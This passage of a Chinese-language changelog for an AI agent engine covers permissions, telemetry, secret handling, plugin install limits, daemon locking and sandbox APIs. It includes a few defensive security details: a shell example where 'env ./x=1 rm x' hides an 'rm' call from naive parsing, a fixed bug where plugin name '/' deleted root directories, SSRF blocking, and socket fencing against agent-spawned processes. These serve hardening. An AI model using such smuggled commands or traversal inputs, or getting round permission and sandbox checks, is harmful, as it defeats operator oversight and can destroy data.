  不再当作改 agent 配置去询问,按项目里的普通文件判;无人值守会话以前在工作树里一写就被拒。
  工作树里的 `.agix`、`.claude`、`.git` 照旧要确认。
- 带 `output_schema` 的 `session.startAgent` 子 Agent 交结果(`StructuredOutput`)不再询问宿主:
  会话本身没有 schema 时没有这个工具,以前子 Agent 的调用按"未知工具"去问,无人答就一直等着。
  现在子 Agent 的调用按它自己那份工具判,父会话的规则照旧适用(deny 了 `StructuredOutput`
  的照样拒)。
- 启动时还不存在的 skill 目录(项目第一次建出 `.agents/skills/`)里后来写进的 skill 能用上了:
  下一次有请求用到这个项目的配置(`commands.list`、建会话等)时按新出现的目录重载,运行中的会话
  在下一轮之前重建,这个目录此后也被监视。以前只有显式 `config.reload` 或重启才看得到。

#### 遥测

- 遥测(`telemetry/<session>.jsonl`、`pool.jsonl`、OTel)`schema_version` 升为 2:payload 不再
  重复信封的 `turn_no` / `turn_id`;从来没有发出过的 15 种事件删除(`config_loaded`、
  `tool_decision`、`intent_classified`、`interrupt_signal`、`context_window_report`、
  `model_route`、`error_record`、`mcp_server_disconnected`、`mcp_tool_call`、`agent_message`、
  `memory_snapshot`、`file_operation`、`tui_action`、`hook_execution`、`outcome_record`),
  再加上下面去掉的 `shutdown_signal`,共去掉 16 种,剩 21 种;`api_error`、`permission_decision`、
  `user_prompt_submit`、`slash_command_used` 现在会发,`mcp_server_connected` /
  `mcp_connection_error` / `startup_timing` 记进 `pool.jsonl`;`Agent` 工具的子 Agent 记
  `agent_spawned` / `agent_completed`。`session_end` 的 token 与调用合计是真数,去掉
  `total_cost_usd` 与 `total_errors`;`startup_timing` 只剩 `total_startup_ms`、`config_load_ms`、
  `pool_build_ms`。遥测文件到 64 MiB 轮转到 `<file>.1`。录像目录与文件只有属主可读写。
- 遥测去掉 `shutdown_signal`(剩 21 种):它紧跟 `session_end` 发,`reason` / `duration_ms` /
  `total_turns` 与 `session_end` 重复,`had_errors` / `exit_code` 恒为 `false` / `0`。用
  `session_end` 的 `stop_reason`。
- `tool_execution` 的字段是真数:`input_json_size`、`result_content_size`(结果文本的字节数)
  以前恒为 0;`user_approved` 只在这次调用问过人、人答应了时为 `true`(以前恒为 `true`);
  失败时有 `error_message`(以前从不出现;daemon 写出前照旧换成 `[REDACTED]`)。
- 遥测文件(`telemetry/<session>.jsonl`、`pool.jsonl`、`options.telemetry.output`)只有属主可读写
  (`0600`,已有的文件打开时也收紧),为它们新建的目录是 `0700`;以前随 umask。
- 常驻团队成员也记 `agent_spawned`(`background: true`)/ `agent_completed`(成员停下时)遥测。
- **OTel 导出器是进程级的**:一个 daemon 只起一个,会话结束只 flush、不再关掉它(以前第一个结束的会话关掉全局 provider,之后整个 daemon 不再导出任何指标与 span)。同一进程里第二个 pool 配了不同的 `endpoint` 时,以先起的那个为准,后者被忽略(记一条 warn);daemon 在监听器退出后 flush 并停掉它。
- `--features otel` 构建的 OTLP/HTTP 导出(端口不是 4317 的端点)以前什么也没发出去——没有
  HTTP 客户端,建导出器时就失败了,只记一条 warn。现在照常发送,端点按 collector 的根地址处理:
  trace 发到 `<端点>/v1/traces`,指标发到 `<端点>/v1/metrics`。原来写成
  `http://collector:4318/v1/traces` 这种带信号路径的,改成根地址。

#### 设置文件

- **`feature_flags` 整段删除。** 还在起作用的两项挪进 `compaction`:`reactive_compact` 改成
  `compaction.reactive`,`cached_microcompact` 改成 `compaction.cached_microcompact`,含义不变、
  默认都关。`feature_flags` 留在配置里照样能加载,但整段被忽略——开着这两项的要搬过去。
  `team_mode`、`plugin_marketplace`、`extended_memory`、`experimental_agent`、
  `recorder_auto_detect`、`dream_task` 从来没有生效;`AGIX_FEATURE_*` 环境变量同样从未生效。
- settings.json 里没有任何设置读的顶层键(拼错的、别的工具的,如 `hooks`)在加载时各记一条
  warn,`daemon.doctor` 的 `settings_tiers[]` 多了 `unknown_keys`。行为不变,仍被忽略。
- `config.setProvider`、`mcp.addServer` / `updateServer`、`project.trust` 与权限询问里的"永久
  允许"改设置文件时上锁(跨进程也互斥)、写临时文件再改名替换;`settings.local.json` 每次写都是
  0600(以前"永久允许,本项目"会把它改成 umask 权限,通常是 0644)。设置文件是符号链接的,
  这些写入都拒绝(`INVALID_PARAMS` / 报错),不再顺着链接写目标文件;用 dotfile 链接管理
  `~/.agix/settings*.json` 的,要么改目标文件,要么换成普通文件。
- `config.setProvider` 不再把 `api_key` 写进项目的 `.agix/settings.json`(按约定要提交的那个):
  它进同目录的 `settings.local.json`(0600),settings.json 里这个 provider 已有的 `api_key` 在下次
  写入时挪过去;响应多了 `secrets_written_to`。直接读 settings.json 找 key 的,改读合并后的
  `config.getProvider`。
- `mcp.addServer` / `mcp.updateServer` 不再把密钥写进要提交的 settings.json:`config` 的
  `headers` 与 `env` 写进同目录的 `settings.local.json`(0600),其余照旧写 settings.json,响应多了
  `secrets_written_to`(改了 settings.local.json 时才有)。settings.json 里这个 server 早先写进去的
  `headers` / `env` 在下次写它时被替换掉;已经提交过的,记得轮换。`mcp.updateServer` 认只在
  settings.local.json 里声明的 server。
- `config.get` / `scene.describe` 的脱敏键名不分大小写,多了 `authorization` 与 `*_token` /
  `*_secret` / `*_password`;`headers`、`env` 对象里的值一律脱敏(以前 MCP 的
  `Authorization` 头与 stdio `env` 原样返回)。

#### 插件与脚本

- **DSH 桥移除。** 引擎不再带 DSH 桥(0.2.7 起有的 `bridges/agix-dsh-bridge`,Node.js 进程),环境变量 `AGIX_DSH_BRIDGE` 一并删除。插件包里 `[[mcp]] kind = "dsh"` 在安装与发现时都被拒,报错给出新写法:把插件做成 stdio MCP 服务器,用 `kind = "native"` 声明。适配外部插件框架由上层用 Rust 插件、`x-` 段或 native MCP 实现(建议已提给 Harnix:openatta/Harnix#65)。
- `plugin.install` 披露里有超限文本(描述 > 500 字符、提示词 > 40 000 字符)的包被拒
  (`INVALID_PARAMS`)并删掉,不再是 `success: true` 加 `disclosure: {"error": …}`;agent 的
  `prompt` 读不到、MCP 的 `config` 读不到或不是 JSON 的包同样装不上。同一版本已经装过的也
  照样读回、照样披露,不过就报错。
- 披露的 `mcp_servers` 每项从 `"<名字> (native)"` 变成 `"<名字> (native): runs `<命令行>`"` /
  `"…: connects to <url> (<type>)"`,后面跟 `; env: A, B` / `; headers: …`(只有键名)。按字符串
  全等比对的要改。
- `[[agent]] prompt`、`[[mcp]] config` 和 `[[script]]` 一样必须在包里面(绝对路径、`..`、
  指到包外的符号链接都拒)。
- 安装有了上限:压缩包 128 MiB,解开后 512 MiB、10 000 个条目、单条压缩比 200 倍(> 1 MiB
  的条目)。安装先解到临时目录再改名就位,并写完成标记 `.agix-installed`;没有它的版本目录
  不算装过,再装同一版本会替换它。
- `enabled.json` 读不了或解析不了时,那一层的包全部按禁用算(以前当作空表,全部启用),
  `plugin.enable` / `plugin.disable` 拒绝覆盖它;`daemon.doctor` 多了 `plugins.enable_state`
  检查。写入改为临时文件加改名。
- 插件名黑名单删除(14 个写死的名字,只查 RPC 的 `name`)。要限定能装什么,用
  `settings.json` 的 `plugins.allow`,它按 manifest 名在发现时检查。
- 脚本绑定的预算有了封顶:`settings.json` 里的 `timeout_ms` 至多 10 000、`calls_per_turn`
  至多 100 000;插件包的 `timeout_ms` 至多 1000、`calls_per_turn` 至多 1000。写得更大的被压到
  上限并打 WARN。
- `RunCode`:主对话直接起的程序进程内同时至多 2×CPU 个(子 Agent 里的不算),多出来的等
  空位;程序结束后不理会取消的子调用最多再等 `stop_grace`(10 秒)就丢下,不再让结果一直
  挂着;时限改用单调时钟。

#### 子 Agent 与团队

- 常驻团队成员(`Agent` 带 `team_name` + `name`)的上限 `execution.team_max_persistent_members`
  是硬的:要新建成员时先回收最久空闲的,腾出一个位置;全都在忙就拒绝(`Denied`,"team member
  limit reached"),给已有成员发消息不受影响。以前全忙时照样新建,稳态比上限多一个。
- 新设置 `execution.max_agent_depth`(默认 3):委派链最深几层,到这一层的 Agent 拿不到 `Agent`
  工具,团队成员同样受限。以前写死 3。
- 父会话结束时(关闭、删除、被驱逐、daemon 停止),它的常驻团队成员随之停下,正在跑的那一轮
  也被取消。以前成员不受会话结束影响,在途的一轮照跑完,空闲的一直留着。

#### daemon 与会话存储

- 同一状态目录下的两个 daemon 不能同时写一个会话:会话在一个 daemon 里活着时,另一个对它
  `session.resume` / `session.run_turn` 报 `INTERNAL_ERROR`,消息含 "being written by another
  process"(以前要么两边交错写进同一份日志,要么 resume 失败后换一个新 id 建会话)。
- 会话日志最后一行写到一半(崩溃、断电)时,读的时候略过那一行而不是整份会话读不回来,
  下一次追加前把它截掉。
- 压缩标记(`compact` 行)写盘失败时,下一次落盘先补写它,之后的行跟在它后面;写进去了
  只是 fsync 失败的,只重试 fsync。以前会把压缩后的消息当普通行再写一遍,日志里同样的内容
  出现两次,恢复出来的会话前面多出一段已经被压掉的历史。
- `session.delete`,以及 `session.close` / `session.delete` 级联删掉的会话,连同
  `sessions/<id>/` 整个目录一起删(会话记忆、metadata、输入历史);以前只删 `metadata.json`。
  会话还在本 daemon 里活着时只留下空的 `writer.lock`。
- `daemon.shutdown`、SIGINT / SIGTERM 先停止接受新连接再关会话;关停期间已连着的连接上新建或
  带回内存会话报错 `the daemon is shutting down`。以前关停的那几秒里还能建出会话来。
- Unix socket 建好后改成 `0600`,daemon 为它新建的目录是 `0700`;以前随 umask(通常 `0755`)。
  别的用户本来就连不上(没有写权限),放宽了 umask 的部署才受影响。
- `daemon.lock` 在 daemon 运行期间持有 `flock`:两个 daemon 同时启动只有一个能起来,另一个报
  "another daemon is already running"。以前两个可能都起来,后起的删掉先起的那个的 socket。
- 被驱逐的会话再用时,先等它旧的运行体停下(`SessionEnd` hook 跑完,最多 5 秒)再重建;以前
  旧的 `SessionEnd` hook 可能和重建出来的会话的 `SessionStart` 同时在跑。
- `--listen` 绑定非回环地址时启动打一条 warn:TCP 不加密,token 明文传输。

### RPC 客户端

#### 权限与计划模式

- `ExitPlanMode` 回到 `EnterPlanMode` 之前的模式,不再一律回 `default`。
- 计划模式里的 `ExitPlanMode` 不再被"plan mode forbids non-readonly tools"拒掉,而是照常询问
  (`prompt`,`tool_name: "ExitPlanMode"`):`permit` 退出,`deny` 留在计划模式。以前计划模式
  经 RPC 退不出来。
- `session.resume` 对活着的会话报它此刻的 `permission.mode`(进了、退了计划模式之后的),
  不再报建会话时的。

#### 方法、帧与错误

- **`options` 逐字段读,被忽略的报在响应里。** `session.create` / `session.run_turn` /
  `session.resume` 的 `options` 里不认识的字段、值读不出来的字段(`"permission_mode": "plann"`)
  被忽略、其余照常生效,列在 `result.ignored_options`(`[{field, error}]`)里并记 warn。以前一个
  字段错了整份 `options` 悄悄当没传,`permission_mode`、`permission_rules` 一起丢掉。**计划
  改为拒绝**(`INVALID_PARAMS`),现在就该把 `ignored_options` 当错误处理。
- 会话建不回来时(例如它记录的 `provider` 已不在配置里),`session.run_turn` / `session.resume`
  报 `INTERNAL_ERROR`,不再换一个新 id、在默认项目和默认场景里建会话顶替(以前 `run_turn`
  会在那个新会话里照常跑完这一轮,结果的 `session_id` 不是请求里的那个)。
- 没有 `id` 的请求(通知)不再收到响应帧,出错和 `TOO_MANY_IN_FLIGHT` 也不回。靠无 `id` 请求
  拿结果的客户端要带上 `id`。
- `session.run_turn` 的 `message` 为空或只有空白、又没有附件,报 `INVALID_PARAMS`,不再当作
  一轮发给模型。
- `turn_complete` 多了可选的 `truncated: true`:OpenAI 兼容的流既没有 `[DONE]` 也没有
  `finish_reason` 就关了时出现(仍当作回复结束,daemon 另记一条 warn),回复可能不完整;遥测
  `api_request` 上同样标 `truncated: true`。其余情况没有这个键。
- 新帧 `notification`(`{message,status}`,协议 §7):模型调用 `PushNotification` 时发给会话的
  订阅者,同时触发 `Notification` hook(`reason` 为通知正文,`tool_name` 为
  `PushNotification`)。宿主该把它当通知送到用户面前;macOS 上引擎所在的机器仍顺带弹一条
  桌面通知,失败不算错。
- `/cost` 报的是会话自载入以来模型调用数、工具调用数和厂商报回的四项 token,不再是按字符数
  估的美元数。
- `session.interrupt` 在模型还没开始回答时(等响应、退避重试之间)也立即生效。回复写到一半被
  打断的一轮以 `stop_reason: "cancelled"` 结束,不再走正常收尾(`stop_reason` 为空、照跑 Stop
  hook、送达排队消息)。
- 新方法 `mcp.auth.start` / `mcp.auth.complete` / `mcp.auth.cancel` / `mcp.auth.logout`,新通知
  `mcp_auth_required` / `mcp_auth_completed` / `mcp_auth_failed`,新错误码 `MCP_AUTH_FAILED`
  (-32021)。`mcp.status` 的元素多了 `auth`,`state` 多了 `auth_required`。
- `mcp.status` 的 `state` 多了 `disconnected`、`connecting`、`failed`(带 `error`);
  `mcp_connect_failed` 的 `error` 写明原因,不再是"看 daemon 日志"。
- 新方法 `project.status`、`project.trust`(协议 §6.8),新通知 `project_trust_changed`,新错误码
  `PROJECT_UNTRUSTED`(-32022,`mcp.addServer` / `mcp.updateServer` / `config.setProvider`
  写进未信任的项目时),`mcp.status` 多了 `state: "untrusted"`,`session.create` /
  `session.resume` 的结果多了 `project_trust`。
- `project.trust` 只收绝对路径(相对路径、`trusted: true` 而目录不存在 → `INVALID_PARAMS`),
  记下的是解析之后的真实目录(`..`、符号链接展开),glob 元字符转义;`matched` 报的因此是这个
  真实路径,不是调用时写的那个。匹配 `trusted` 条目时,带 `.` / `..` 的项目根只按解析之后的
  目录比。
- `plugin.install` / `plugin.uninstall` 的 `name`、`version` 只收 1–128 个 ASCII 字母、数字、
  `.`、`_`、`-`、`+`,不以 `.` 开头,别的报 `INVALID_PARAMS`(以前 `{"name": "/"}` 会把根目录
  下的目录逐个当版本删掉);`plugin.install` 还要求包里 `[plugin] name` 等于 `name`。
- 团队的 `SendMessage` 只投给团队声明过的成员,`peer` 不在其中时报错并列出成员;提示词改成与
  schema 一致的 `{"peer", "message"}`(以前教的 `to` / `summary` / `"*"` 广播从来不被接受)。
  不是纯 ASCII 文件名的成员标签,邮箱文件改名为 `mailbox/~<hash>.jsonl`。
- `session.export` 的 `runtime.json` 去掉 `plan_text`(一直是 `null`)。

### 嵌入方

#### 权限与沙箱

- `PermissionMode::Auto`、`PermissionMode::Yolo` 删除(`base::permission` 与
  `base::settings` 两份都删),用 `BypassPermissions`。`permissiveness()` 的取值跟着变了。
- 权限分类器整个删除:`permissions::gate::{AutoClassifier, ClassifyDecision}`、
  `PermissionGate::with_auto_classifier` / `with_yolo_classifier`、`permissions::llm_classifier`、
  `permissions::yolo`、`DecisionReason::Classifier`、`call_purpose::CLASSIFY`;一并删掉只服务它的
  `PermissionGate::{record_denial, record_success, consecutive_denials, total_denials,
  should_fallback_to_prompting}`。
- `SessionState` 多了 `enter_plan_mode()` / `exit_plan_mode()`;`set_permission_mode` 会忘掉
  进入计划模式前记下的模式。
- `SessionState` 多了 `bind_tools()` / `tool()`:会话派发工具用的注册表,`runtime::agent::Builder::build`
  绑上。`RuleSetPermission::check_for_delegate` 先在 delegate 的注册表里找工具,找不到才用自己的;
  自己实现 `Permission` 又要判 delegate 调用的,同样可以用 `delegate.tool(name)`。
- `Tool` 多了 `accept_edits_allows(input, ctx)`(缺省即 `is_read_only(input)`),`acceptEdits`
  的模式分派用它代替 `is_read_only`;自己包一层 `Tool` 的要转发它(`DeferredTool` 已转发)。
  新增 `permissions::invocation::{traced_invocations, Traced}` 与
  `base::interface::exec::domains_name_host`。`invocations` 把 `env` / `sudo` 后面任何带 `=`
  的词都当作赋值(`env 'A=1' rm x`、`env ./x=1 rm x` 启动的是 `rm x`)。
- `Tool` 多了 `leaves_plan_mode()`(缺省 `false`),`Permission` 多了 `check_for_delegate()`
  (按子 Agent 自己的 `SessionState` 判;缺省忽略它、照 `check` 判),都有缺省实现,已有实现
  不用改。自己包一层 `Permission` 的,转发 `check_for_delegate`,子 Agent 的模式和它读过的
  文件才传得到里层。
- `PermissionGate::check` 的模式取 `ctx.permission_mode`,不再读 `ctx.session`;直接调 gate 的
  要把它填成会话当前的模式(`RuleSetPermission` 已经这么做)。
- `permissions::ruleset::RuleHit` 多了 `Unclear`(按 ask 处理),穷举匹配要补一支。
  新增 `permissions::invocation`、`permissions::shell::{segments, Segment, lex, Word, assignments}`。
- `RuleSet::evaluate_shell` 多一个 `group: Option<&str>` 参数(shell 命令的组名,`Monitor` 传
  `Some("Bash")`);新增 `permissions::ruleset::shell_rule_group`。
- 删除 `permissions::ruleset::{SAFE_TOOLS, CheckResult, RuleSet::check}` 与
  `PermissionGate::explain_decision`:都没有生产调用点(裁决走 `PermissionGate::check`)。
- `AgentTypeSource::may_loosen` 同时管 `max_turns` 与 `permission_mode`。新增
  `PermissionMode::for_delegate`(两个 `PermissionMode` 上都有)。
- `base::permission::PermissionMode` 多了 `min_permissive`,并能 `into()` 成
  `base::settings::PermissionMode`。
- `SessionState` 去掉 `plan_text` / `set_plan_text` / `clear_plan_text` 与 `plan_slug` 那三个;
  `compaction::compact::PostCompactContext` 去掉 `plan_content`。
- `runtime::agent::Agent` 去掉 `set_plan_mode`、`register_running_task`、`clear_running_tasks`:
  压缩后的提醒现在直接读会话状态——处于 plan 模式、还在跑的后台任务,在丢掉或总结了历史的
  压缩(不含只清工具结果的 MicroCompact)之后各补一条。
- `tools::plan_verify` 模块与 `tools::plan_mode::{plan_text, plan_state_for_test}` 删除。
- `base::interface::exec::SandboxPolicy` 多了 `deny_ipc_escapes`,`base::tool::SandboxSettings`
  与 `base::context::config::SandboxPolicyConfig` 多了 `unattended_requires_network_policy`;
  用结构体字面量构造它们的要补字段(或改用 `..Default::default()`)。
- `DaemonServer::bind_unix` 把 socket 登记给沙箱(`base::interface::exec::local::sandbox::
  fence_socket`),`serve_tcp_listener` / `serve_ws_listener` 登记端口(`fence_port`);
  `serve_unix_listener` 拒绝本进程起的进程(`base::interface::exec::local::lineage::started_here`)。
  自己 bind 监听器、不经 `bind_unix` 的,调一次 `fence_socket`。嵌着 daemon 的进程里,自己起的
  子进程连不上这个 socket:要连的客户端得是宿主自己或者别的、不由它起的进程。
  `DaemonServer::bind_unix` 把 socket 设为 `0600`(自己 chmod 的可以去掉)。

#### 项目信任与设置

- `Settings` 多了 `project_trust`(全局层的设置)、`project_layer`(`Settings::load` 算出的
  信任判定与 `requires_trust`,不读不写文件)与 `ignored_values`(加载时因类型不对丢掉的值,
  `base::settings::IgnoredValue`);用结构体字面量构造的要补这三项(`Default::default()` /
  `Vec::new()`)。代码里造的 `Settings` 的 `project_layer` 缺省是"没有项目层",什么都不扣。
  `base::context::EngineConfig` 多了 `project_untrusted`。新模块 `base::project_trust`(含
  `exact_pattern`)与 `base::settings_file`(设置文件的加锁读改写)。
- `permissions::settings_patch::AppendError` 改为 `File(base::settings_file::SettingsFileError)`、
  `NoFileName`、`NotAList` 三支;去掉 `Io` / `BadJson` / `NotObject`。穷举匹配它的要跟着改。
- `assembly::doctor::SettingsTiersCheck::new` 多一个 `&Settings` 参数(报它加载时丢掉的值)。
- `base` 的 cargo feature `team-mode`、`plugin-marketplace`、`experimental-agent` 删除
  (什么也不控制)。`base::features` 整个删除,`Settings::feature_flags` 随之去掉;
  `CompactionConfig` 多了 `reactive` 与 `cached_microcompact`。

#### MCP 与 OAuth

- `mcp::config::McpServerConfig::Stdio` 多了 `working_dir: Option<PathBuf>`(不从配置读,
  `serde` 跳过;`None` 是原来的行为),由新方法 `run_in(dir)` 设置;用结构体字面量构造它的要补
  `working_dir: None`。
- `McpServerConfig::InProcess` 删除,`McpPolicyGate::admit` 不再豁免它。`McpServerConfig` 新增
  `confined_to_own_env()`,`mcp::config` 新增 `expand_vars_with`;`McpError` 新增 `is_permanent()`。
- `base::interface::mcp_servers::McpServers` 多了必须实现的
  `async fn refresh_if_changed(&mut self) -> bool`;回合循环在工具步骤之后调它,不再调
  `refresh_tools`(`EngineCommand::RefreshMcp` 仍然全量重列)。
- `mcp::notify::NotificationQueue` 删除,换成 `Announcements`(按 server、按种类计数,
  `sink()` / `record()` / `of()`)与 `ListEpochs`;`McpManager::refresh_tools_if_announced` 改名
  `refresh_if_changed`(也重读宣布过变化的 prompt),`pending_notifications` 删除。`share()`
  出来的 manager 与原来那个读同一份通知。`McpManager::refresh_tools` / `refresh_prompts` 对
  列表失败的 server 保留它原有的工具 / prompt。`NotifyingHandler` 多了 `keeping()`。
- `base::interface::exec::local::orphans` 新增 `list(group) -> Listed`(drop 时移出登记)与
  `listed()`。
- `mcp::output_cache::MAX_CACHED_RESULT_BYTES` 新增。
- `auth` crate 整个删除(`OAuth2Client`、`TokenStore`、`CallbackListener`、`PkceVerifier`、
  `ProviderConfig`……),它只有 MCP 在用;OAuth 现在是 `mcp::oauth`,协议部分用 rmcp。
- `mcp::oauth::{McpOAuth, McpOAuthStore, McpOAuthResolver}` 删除,`McpAuth` 取代 `McpOAuth`;
  `mcp::auth_tool::McpAuthTool`(从未注册)删除。
- `Assembly::mcp_oauth_resolver` 删除,换成 `mcp_credential_store: Option<Arc<dyn
  mcp::oauth::McpCredentialStore>>`(令牌存哪,默认 0600 文件)与 `mcp_oauth_client:
  Option<mcp::oauth::McpOAuthClient>`(动态注册时的客户端名、CIMD 地址)。
  `SessionPool::with_mcp_oauth_resolver` / `mcp_oauth()` 换成 `with_mcp_auth(store, client)` /
  `mcp_auth()`。
- `McpServerConfig::{StreamableHttp, Sse}` 的 `oauth_provider: Option<String>` 换成
  `oauth: Option<McpOAuthConfig>`;`oauth_provider()` 删除,有 `oauth()` 与 `oauth_capable()`。
- `McpManager::connect_all_with_oauth` 换成 `connect_all_with(servers, env, auth: Option<Arc<McpAuth>>)`;
  新增 `share()`(会话用的、共享连接的那一份)、`pending()`(等登录的 server)。
  `McpError` 多了 `AuthRequired` / `InsufficientScope`。
- `McpManager::from_clients` 改成 `async`,读好工具与 prompt 再返回。新增
  `connect_all_within(.., wait)`(到点先返回,其余经 `LateConnects` / `absorb()` 陆续进来)、
  `connecting()`、`failed()`;`ServerStatus` 多了 `connected`。
- `McpServerConfig` 每个变体多了 `timeouts: McpTimeouts`(`#[serde(flatten)]`;结构体字面量要补
  `timeouts: Default::default()`)。`McpError` 多了 `ConnectionLost`、`Timeout`;
  `McpClient` 多了带默认实现的 `is_connected()`。
- 新模块 `mcp::naming`(`tool_name`、`tool_names`、`server_segment`);
  `mcp::prompts::{split_command_name, MCP_COMMAND_PREFIX}` 删除,`McpToolAdapter` 多了 `named()`。
- rmcp 升到 3.9,开了 `auth`、`auth-client-credentials-jwt`、`auth-enterprise-managed`。
- `Assembly` 多了 `mcp_enterprise_idp: Option<mcp::config::EnterpriseIdp>`;`McpPolicy` 多了
  `allowed_authorization_servers`、`enterprise_idp` 两个字段(结构体字面量要补,或用
  `..Default::default()`)。`McpOAuthConfig` 多了 `grant`、`private_key_jwt`。

#### hooks

- `hooks::config::HookConfig::{Prompt, Agent}` 多了 `may_approve: bool`(结构体字面量要补;
  `false` 即它的批准不算)。
- `hooks::HookConfig::{Prompt, Http, Agent}` 多了 `if_pattern: Option<String>`(结构体字面量
  要补)。`hooks::runner::DEFAULT_HOOK_TIMEOUT_MS` 是 `60_000`。
- `base::interface::exec::HttpRequest` 多了 `public_only: bool`(结构体字面量要补;`new()`
  缺省 `false`,`public_only()` 置位),新增 `base::interface::exec::is_internal_address`。
  `LocalNetwork` 对 `Origin::Agent` 的请求与 `public_only` 的请求在每一跳上拒绝内部地址;
  自己实现 `Network` 的要照做。`hooks::runner::ssrf` 模块删除。
- `hooks::HookRunner::enable_file_watching` 多了 `ambient: hooks::payload::Ambient`(payload 的
  会话 id、cwd、模式,触发时现取),第二次调用往同一个 watcher 里加文件而不是替换它;新增
  `watch_files`。`run_elicitation` / `run_elicitation_result` 第一个参数是 `&Ambient`,
  `check_rewakes` 收一个 `HookInput` 作底。`hooks::watcher::FileWatcher` 的 `new` /
  `watch_paths` 换成 `start` / `add`。`HookInput` 多了 `stop_hook_active`、`team_name`、
  `teammate_name`(结构体字面量要补或用 `..Default::default()`),新增 `with_team`、
  `from_ambient`。
- `runtime::module::SessionContext` 多了 `hook_ambient`。`runtime::agent::Builder` 多了
  `team_seat(TeamSeat)`;只在 `agent_depth` 为 0 的会话上启动 `FileChanged` 监视。
- `hooks::HookResponse` 去掉 `suppress_output`。`check_rewakes` 在没有 hook 等着时把通道里的信号
  清掉:hook 要求唤醒之前就结束的工作不算数。
- `runtime::agent::Builder` 没给 `wake_receiver`、hooks runner 又是自己建的(根会话)时,
  会话的运行中任务结束就唤醒 `async_rewake` hook;给了 `wake_receiver` 的照旧只听它。
- `hooks::HookConfig` 的四个变体都多了 `on_error: hooks::OnError`(结构体字面量要补,
  `OnError::Allow` 是原来的行为)。`HookOutcome::Ran` 多了 `failure: Option<String>`:跑了但
  回答不能用(退出码不是 0 或 2、不是 JSON)时写明原因。
- `hooks::HookConfig::Http` 多了 `allow_local: bool`。`base::interface::exec::HttpRequest` 多了
  `internal_target: bool`(结构体字面量要补;`public_only_but_target()` 连同 `public_only` 一起
  置位):`Origin::Operator` 的请求去 url 自己的主机与端口时不查内部地址。自己实现 `Network`
  的要照做。

#### 模型与回合

- `AgentEvent` 多了 `Notification { message, status, turn_id }`;穷举匹配它的要补一支。
- `AgentEvent::TurnComplete` 多了字段 `truncated`,`ModelEvent` 多了变体 `Truncated`(OpenAI
  兼容适配器在补出的 `EndTurn` 之前发),`telemetry::ApiRequestPayload` 多了 `truncated`。
  用结构体字面量构造前两者 / 穷举匹配 `ModelEvent` 的要跟着改。
- `AnthropicModel::stream` / `OpenAICompatibleModel::stream` 在返回前等到厂商开始回答:请求被拒
  (状态码、连不上、重试用尽)从 `stream()` 返回 `Err`,不再是流的第一项;两者都认传进来的
  `CancellationToken`,取消时 `stream()` 返回 `ModelError::Cancelled`,流里出 `Err(Cancelled)` 后结束。
  一个什么都没发就结束的 Anthropic 响应是 `ModelError::Network`。
- 流里的 `error` 事件按它的 `type` 分类(`overloaded_error` → `Overloaded`、`rate_limit_error` →
  `RateLimited`、`invalid_request_error` → `Api{400}`……),不再一律 `Api{500}`;Chat Completions
  流里的 `{"error":…}` 块同样成为 `Err`(`ChatCompletionChunk` 多了 `error` 字段)。
  `AnthropicError::StreamInterrupted` 映射为 `ModelError::Network`(原为 `Internal`)。
- `model::stream::ContentBlockStart` 与 `BlockDelta` 多了 `Unknown`:不认识的块类型、增量类型
  跳过这一块,不再让整条流解析失败;穷举匹配它们的要补一支。
- 自己实现 `Model` 的:流必须以 `ModelEvent::EndTurn` 收尾,没有它的流被当作中途断开。
- `ModelEvent` 多了 `MalformedToolUse { id, name, raw_input }`:参数解析不了的工具调用,两个
  内置适配器以它代替 `ToolUse { input: {} }`;穷举匹配 `ModelEvent` 的要补一支,自己实现
  `Model` 的也该这样报。
- `InputMessage::ToolResult` 的 `tool_use_id` 必须是最近一条回复里还没有结果的调用,否则
  `process_turn` 返回 `TurnError::Internal`、transcript 不变。发往模型的请求里,不对应前一条
  回复里任何 `tool_use` 的 `tool_result` 被去掉。
- `EngineConfig::file_limits` 的 `max_tool_result_chars` 删除(从没有地方读它;单条工具结果的
  上限是压缩器的 50,000 字符);`default_read_lines`、`max_line_chars` 现在真的决定 `Read` 的
  默认行数与单行上限(以前写死 2000)。新增 `base::tool::MAX_IMAGE_BYTES`。
- `ToolExec::with_timeout` 起的计时任务随这次调用结束,不再睡到超时。
- `runtime::streaming::execute_stream` 返回 `Result<StreamResult, StreamFailure>`(原为
  `Result<_, TurnError>`);`StreamResult` 多了 `cancelled`。
- `StopRecovery` 多了 `Continue`,`DefaultRecovery` 对 `pause_turn` 返回它;穷举匹配
  `StopRecovery` 的要补一支。
- `HttpAnthropicClient::with_base` 自己把 base 归成 `…/v1/messages`(新增
  `model::client::messages_url`),调用方不用再补结尾的 `/`(以前不补,`https://relay/anthropic`
  的 `anthropic` 会被换掉);不能带路径的 URL(`data:`)在这里报 `AnthropicError::ParseError`,
  不再等到第一次请求。

#### 压缩与记忆

- 自己实现 `Compactor` 的:引擎传给 `compact` 的 `max_tokens` 在自动压缩时是阈值减去
  请求的固定开销与必然补回的提醒;返回的策略不是 `NoOp`、对话却没有变小(连同补回的提醒
  一起算)的,引擎不采用。`DefaultCompactor` 的兜底一条都折不掉时返回 `NoOp`。
- `compaction::llm_summary::LlmSummarizer::summarize` 与 `full_compact` 多一个
  `&CancellationToken` 参数(回合的取消令牌;不需要取消的传 `&CancellationToken::new()`),它触发时
  立即放弃这次摘要并返回新增的 `CompactError::Cancelled`;穷举匹配 `CompactError` 的要补一支。
- `CompactError::Exhausted` 删除(从没有构造过);`compaction::reactive` 删掉零调用的
  `ReactiveCompactConfig`、`CompactionLevel`、`calculate_thresholds`、`compaction_level`、
  `should_compact_with_state` 与 `CompactionState::last_compact_turn`。新增
  `compaction::llm_summary::is_summary`。
- `ToolResultBudget` 的 `max_per_result` / `max_total` 改按字符计(以前是字节);新增
  `compaction::compact::TOOL_IMAGE_CHARS`。
- `compaction::cached::clear_stale_tool_results` 保留 `tool_use_id`(以前置空,请求会被拒),
  已经清过的不再计数、不再报进 `cache_edits`。
- `SessionManager::replace_messages_after_compact` 自己重排 `message_timestamps`(压缩留下的
  尾部保留原来的时间,前面新插入的记为现在),调用方不要再 `truncate` 它;`resume` 之后的
  `turn_count` 是用户发起的轮数(用户消息与斜杠命令展开),不再是日志行数。
- `base::frozen::find_relevant_memories`、`base::memory::select_memories_with_llm`、
  `MemoryStore::scan_memory_headers` 删除;按相关性挑记忆用 `base::memory::select_memories_from`
  (生产路径 `MemoryRetriever` 一直走它)。
- 新增 `MemoryStore::for_paths`(会话用的记忆目录唯一的推导处)、`user_dir`、`record_recalled`,
  `base::memory::{memory_prompt, MAX_MEMORIES}`;`scan_for_secrets` / `SecretPattern` 挪到
